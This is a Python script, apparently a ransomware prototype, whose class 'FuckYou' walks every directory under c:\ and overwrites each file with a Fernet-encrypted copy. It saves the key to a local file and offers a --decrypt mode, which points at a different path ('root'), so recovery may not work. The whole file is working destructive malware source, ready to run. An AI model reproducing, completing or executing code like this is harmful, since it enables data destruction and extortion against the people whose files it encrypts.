import os
import shutil
import argparse
from cryptography.fernet import Fernet


class FuckYou:
    def __init__(self) -> None:
        self._key = None
        
    def encrypt_file(self, path_file):
        F = Fernet(self._key)
        
        with open(file=path_file, mode="rb") as fileobj1:
            data_original = fileobj1.read()
        
        with open(file=path_file, mode="wb") as fileobj2:
            data_mod = F.encrypt(data_original)
            fileobj2.write(data_mod)
            
    def decrypt_file(self, path_file):
        F = Fernet(self._key)
        
        with open(file=path_file, mode="rb") as fileobj1:
            data_mod = fileobj1.read()
            
        with open(file=path_file, mode="wb") as fileobj2:
            data_original = F.decrypt(data_mod)
            fileobj2.write(data_original)

    def worm(self, path, type):
        print(f"[Entrando na pasta] {path}")
        try:
            for file in os.listdir(path):
                if os.path.isdir(os.path.join(path, file)):
                    self.worm(os.path.join(path, file), type=type)
                 
                else:
                    if file != "fuckyousystem.key":
                        if type == 1:
                            self.encrypt_file(os.path.join(path, file))
                        
                        elif type == 2:
                            self.decrypt_file(os.path.join(path, file))
                        
                    
        except PermissionError:
            pass
    
    def save_key(self):
        with open("fuckyousystem.key", "wb") as f:
            f.write(self._key)
    
    @property
    def key(self):
        return self._key
    
    @key.setter
    def key(self, value):
        self._key = value    
    
if __name__ == "__main__":    
    parser = argparse.ArgumentParser()
    parser.add_argument("--decrypt", action="store_true", help="Decrypt data")
    parser.add_argument("--key", type=str)
    args = parser.parse_args()
    
    fuck = FuckYou()
    
    if args.decrypt:
        if args.key:
            fuck._key = args.key
            fuck.worm(path="root", type=2)
        
        else:
            parser.print_help()
    else:
        fuck._key = Fernet.generate_key()
        fuck.worm(path="c:\\", type=1)
        fuck.save_key()
